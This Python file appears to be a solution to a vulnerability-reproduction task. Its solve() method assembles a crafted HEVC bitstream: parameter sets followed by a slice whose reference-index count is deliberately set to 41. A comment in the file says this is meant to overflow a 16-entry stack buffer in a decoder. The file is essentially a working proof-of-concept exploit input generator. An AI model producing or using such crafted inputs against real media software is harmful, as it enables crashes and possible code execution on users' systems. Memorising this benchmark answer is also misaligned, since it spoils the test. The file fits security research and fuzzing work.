import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitStream:
            def __init__(self):
                self.bits = []
            
            def u(self, n, val):
                s = f"{val:0{n}b}"
                if len(s) > n:
                    s = s[-n:] 
                self.bits.append(s)
            
            def ue(self, val):
                if val == 0:
                    self.bits.append("1")
                    return
                x = val + 1
                b = f"{x:b}"
                m = len(b) - 1
                self.bits.append("0" * m + b)
                
            def se(self, val):
                if val <= 0:
                    v = (-val) * 2
                else:
                    v = val * 2 - 1
                self.ue(v)
            
            def get_rbsp(self):
                s = "".join(self.bits)
                s += "1" 
                while len(s) % 8 != 0:
                    s += "0"
                
                data = bytearray()
                for i in range(0, len(s), 8):
                    data.append(int(s[i:i+8], 2))
                return data

        def make_nal(nal_type, rbsp_data):
            # Header: F(0) Type(6) Layer(6) TID(3)
            # byte 1: (0 << 7) | (type << 1) | (layer >> 5)
            # layer=0.
            b1 = (nal_type << 1) & 0x7E
            # byte 2: (layer & 0x1F) << 3 | tid
            # tid=1
            b2 = 1 
            
            # EP
            ep_data = bytearray()
            zero_cnt = 0
            for b in rbsp_data:
                if zero_cnt >= 2 and b <= 3:
                    ep_data.append(3)
                    zero_cnt = 0
                ep_data.append(b)
                if b == 0:
                    zero_cnt += 1
                else:
                    zero_cnt = 0
            
            return b'\x00\x00\x00\x01' + bytes([b1, b2]) + ep_data

        # --- VPS (Type 32) ---
        bs = BitStream()
        bs.u(4, 0) # vps_id
        bs.u(1, 1) # base_layer_internal
        bs.u(1, 1) # base_layer_available
        bs.u(6, 0) # max_layers_minus1
        bs.u(3, 0) # max_sub_layers_minus1
        bs.u(1, 1) # temporal_id_nesting
        bs.u(16, 0xFFFF) 
        # PTL
        bs.u(2, 0) 
        bs.u(1, 0) 
        bs.u(5, 1) 
        bs.u(32, 0x60000000) 
        bs.u(1, 1) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 1) 
        bs.u(44, 0) 
        # sub_layer_ordering
        bs.u(1, 0) # present_flag=0
        bs.ue(1) 
        bs.ue(0) 
        bs.ue(0) 
        
        bs.u(6, 0) 
        bs.ue(0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        vps = make_nal(32, bs.get_rbsp())

        # --- SPS (Type 33) ---
        bs = BitStream()
        bs.u(4, 0) 
        bs.u(3, 0) 
        bs.u(1, 1) 
        # PTL
        bs.u(2, 0) 
        bs.u(1, 0) 
        bs.u(5, 1) 
        bs.u(32, 0x60000000) 
        bs.u(1, 1) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 1) 
        bs.u(44, 0) 
        
        bs.ue(0) # sps_id
        bs.ue(1) # chroma 4:2:0
        bs.ue(64) 
        bs.ue(64) 
        bs.u(1, 0) 
        bs.ue(0) 
        bs.ue(0) 
        bs.ue(0) # log2_max_pic_order_cnt_lsb_minus4
        bs.u(1, 0) # sub_layer_ordering=0
        bs.ue(1) 
        bs.ue(0) 
        bs.ue(0) 
        
        bs.ue(0) 
        bs.ue(0) 
        bs.ue(0) 
        bs.ue(0) 
        bs.ue(0) 
        bs.ue(0) 
        
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        
        bs.ue(0) # num_short_term_rps
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        sps = make_nal(33, bs.get_rbsp())
        
        # --- PPS (Type 34) ---
        bs = BitStream()
        bs.ue(0) 
        bs.ue(0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(3, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.ue(0) 
        bs.ue(0) 
        bs.se(0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.se(0) 
        bs.se(0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        bs.u(1, 0) 
        pps = make_nal(34, bs.get_rbsp())
        
        # --- Slice (Type 1 - TRAIL_R) ---
        bs = BitStream()
        bs.u(1, 1) # first_slice
        bs.ue(0) # slice_pps_id
        bs.ue(0) # slice_type=B
        bs.u(4, 0) # slice_pic_order_cnt_lsb
        
        bs.u(1, 0) # short_term_ref_pic_set_sps_flag=0
        # st_ref_pic_set
        bs.u(1, 0) # inter_ref_pic_set_prediction_flag
        bs.ue(1) # num_negative_pics
        bs.ue(0) # num_positive_pics
        bs.ue(0) # delta_poc_s0_minus1[0]
        bs.u(1, 1) # used_by_curr_pic_s0_flag[0]
        
        # slice_type=B != I
        bs.u(1, 1) # num_ref_idx_active_override_flag
        bs.ue(40)  # num_ref_idx_l0_active_minus1 -> 41 entries. Overflow Stack Buffer (size 16)
        bs.ue(0)   # num_ref_idx_l1_active_minus1
        
        bs.u(1, 1) # mvd_l1_zero_flag
        bs.ue(0) # five_minus_max_num_merge_cand
        bs.se(0) # slice_qp_delta
        
        slice_nal = make_nal(1, bs.get_rbsp())
        
        return vps + sps + pps + slice_nal